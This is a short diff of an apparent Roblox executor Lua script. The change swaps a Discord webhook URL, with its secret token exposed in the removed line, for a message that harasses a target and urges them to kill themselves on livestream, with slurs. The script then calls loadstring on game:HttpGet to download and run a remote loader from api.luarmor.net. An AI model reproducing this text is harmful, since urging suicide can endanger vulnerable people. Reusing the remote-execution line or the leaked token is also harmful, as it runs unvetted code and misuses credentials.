@@ -170,7 +170,7 @@ spawn(WebsiteDataUpdate)
 
 
 getgenv().Config = {
-    ["Webhook"] = "https://discord.com/api/webhooks/1308201586002231458/Sa8moFVpoGf5-P_Bws7jAwrZFuQOyaKW_yGQAUEIEVzIiSDcp7N-Ekc2aFu_jXzU0g99",
+    ["Webhook"] = "to the dumb fuck who keeps coming here please kill yourself on live , ur so misreable with ur life u got nobody by ur side how does it feel going to sleep with being a worrhless human being that nobody loves ???? also to the dumb fuck who lost his huges redculous dream or smt please blow ur head off and record it live u fucking retard",
     ["UserID"] = "",
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/74724ab99fe6df2fd4819846e0282a56.lua"))() 
